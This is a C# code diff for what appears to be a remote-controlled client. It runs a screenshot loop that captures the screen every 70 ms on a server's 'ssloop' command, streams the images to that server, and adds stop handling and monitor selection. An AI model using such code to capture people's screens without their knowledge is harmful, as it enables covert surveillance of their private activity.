@@ -13,7 +13,11 @@ namespace Client
     {
         public static JObject config = GClass.config();
         public static int monitoridx = 0;
+
         private static CancellationTokenSource screenshotTokenSource;
+        private static Task screenshotLoopTask;
+        private static readonly object screenshotLock = new();
+        private static bool screenshotLoopRunning = false;
 
         [STAThread]
         static void Main()
@@ -59,11 +63,23 @@ namespace Client
                     switch (command)
                     {
                         case "ssloop":
-                            await StartScreenshotLoopAsync(client, message); // pass the message!
+                            if (!screenshotLoopRunning)
+                            {
+                                await StartScreenshotLoopAsync(client, message);
+                                screenshotLoopRunning = true;
+                            }
                             break;
 
                         case "stopss":
-                            StopScreenshotLoop();
+                            if (screenshotLoopRunning)
+                            {
+                                await StopScreenshotLoopAsync();
+                                screenshotLoopRunning = false;
+                            }
+                            break;
+
+                        case "mon":
+                            monitoridx = (int)message["idx"];
                             break;
                     }
                 }
@@ -72,27 +88,27 @@ namespace Client
                     // optional error handling
                 }
             };
-
         }
 
         static async Task StartScreenshotLoopAsync(LazyServerClient client, JObject message)
         {
-            StopScreenshotLoop();
+            await StopScreenshotLoopAsync();
+
             screenshotTokenSource = new CancellationTokenSource();
             var token = screenshotTokenSource.Token;
 
-            int quality = 100; // default
+            int quality = 100;
 
             if (message["quality"] != null)
             {
                 string qualityStr = (string)message["quality"];
                 if (qualityStr.EndsWith("%") && int.TryParse(qualityStr.TrimEnd('%'), out int qVal))
                 {
-                    quality = Math.Max(10, Math.Min(qVal, 100)); // manual clamp
+                    quality = Math.Max(10, Math.Min(qVal, 100));
                 }
             }
 
-            await Task.Run(async () =>
+            screenshotLoopTask = Task.Run(async () =>
             {
                 while (!token.IsCancellationRequested)
                 {
@@ -105,26 +121,52 @@ namespace Client
                             ["monitors"] = Screen.AllScreens.Length
                         }.ToString());
                     }
-                    catch
+                    catch (OperationCanceledException)
                     {
-                        // Handle exception if needed
+                        break;
+                    }
+                    catch (Exception)
+                    {
+                        // optionally log errors
                     }
 
-                    await Task.Delay(70, token);
+                    try
+                    {
+                        await Task.Delay(70, token);
+                    }
+                    catch (OperationCanceledException)
+                    {
+                        break;
+                    }
                 }
             }, token);
+
+            screenshotLoopRunning = true; // Ensure flag is set on start too
         }
 
-
-
-        static void StopScreenshotLoop()
+        static async Task StopScreenshotLoopAsync()
         {
-            if (screenshotTokenSource != null)
+            lock (screenshotLock)
             {
+                if (screenshotTokenSource == null)
+                    return;
                 screenshotTokenSource.Cancel();
-                screenshotTokenSource.Dispose();
-                screenshotTokenSource = null;
             }
+
+            if (screenshotLoopTask != null)
+            {
+                try
+                {
+                    await screenshotLoopTask;
+                }
+                catch (OperationCanceledException) { }
+                catch { }
+            }
+
+            screenshotTokenSource?.Dispose();
+            screenshotTokenSource = null;
+            screenshotLoopTask = null;
+            screenshotLoopRunning = false; // Reset the flag here as well
         }
     }
 
